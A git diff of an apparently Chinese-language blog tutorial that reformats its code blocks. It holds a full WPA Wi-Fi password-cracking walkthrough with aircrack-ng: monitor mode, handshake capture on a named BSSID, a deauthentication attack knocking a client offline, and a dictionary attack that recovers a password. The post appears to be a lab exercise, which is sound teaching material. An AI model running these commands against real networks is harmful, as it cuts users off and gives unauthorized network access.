@@ -26,8 +26,8 @@ featuredImage: https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/AircrackWPA/0
 
 首先启动监听：
 
-```bash
-sudo airmon-ng start wlan0
+```shell
+$ sudo airmon-ng start wlan0
 ```
 
 结果如图：
@@ -40,8 +40,8 @@ sudo airmon-ng start wlan0
 
 随后扫描无线网络：
 
-```
-sudo airodump-ng wlan0mon
+```shell
+$ sudo airodump-ng wlan0mon
 ```
 
 结果如图，可以看到 `nova 4` 网络的 BSSID 为 `D8:9B:3B:9E:AB:A9`。
@@ -50,8 +50,8 @@ sudo airodump-ng wlan0mon
 
 利用该 BSSID 过滤掉其余网络流量：
 
-```
-sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon
+```shell
+$ sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon
 ```
 
 结果如图：
@@ -68,8 +68,8 @@ sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon
 
 可以看到 MAC 地址为 `F4:8C:50:9F:E5:43`。实际上，在前面 `airodump-ng` 时的界面中也可以直接看到连接了该网络的主机 MAC 地址。随后发送 `DeAuth` 包使其掉线：
 
-```
-sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon
+```shell
+$ sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon
 ```
 
 出现 `WPA handshake` 即捕获到了握手包，可以停止捕获了。
@@ -80,8 +80,8 @@ sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon
 
 此时在目录下会生成 `psk-01.cap` ，我们使用 `aircrack-ng` 进行口令破解：
 
-```
-sudo aircrack-ng -w password.lst -b D8:9B:3B:9E:AB:A9 psk*.cap
+```shell
+$ sudo aircrack-ng -w password.lst -b D8:9B:3B:9E:AB:A9 psk*.cap
 ```
 
 使用的字典中包含了 `merc123321` 这个真正的密码：
